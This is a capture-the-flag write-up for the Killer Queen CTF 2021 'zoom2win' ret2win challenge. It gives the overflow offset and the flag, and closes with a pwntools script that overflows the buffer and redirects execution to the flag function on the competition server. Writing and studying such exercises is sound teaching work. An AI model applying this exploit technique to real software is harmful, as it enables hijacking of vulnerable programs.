---
layout: writeup
title: zoom2win
ctf: Killer Queen CTF
points: 214
solves: 184
tags: 
    - pwn
date: 2021-11-01
description: |-
    What would CTFs be without our favorite ret2win.
flag: kqctf{did_you_zoom_the_basic_buffer_overflow_?}
---
<details>
    <summary>tl;dr</summary>
    
</details>

***

## Introduction

This is a basic ret2win challenge. We have a buffer overflow and find the size to be 40 before getting access to RSP. We find the address of the flag function with

    $ objdump -d zoom2win | grep flag

This returns

    $ 0000000000401196 <flag>:

So we can basically send 40 `A`s followed by this address. This works locally, but not remotely. This is due to stack alignment, so we need an extra return instruction first. We can run `ropper -f zoom2win` and find a `ret` gadget to only insert an extra return. This will align the stack but not change what we are doing. The following Python script gets the flag from the server:

```python
from pwn import *

p = remote("143.198.184.186", 5003)
p.recvline()

padding = b"A" * 32
rbp = b"B" * 8
ret = p64(0x40101a)
flag_address = p64(0x401196)
payload = padding + rbp + ret + flag_address

p.sendline(payload)
p.interactive()
```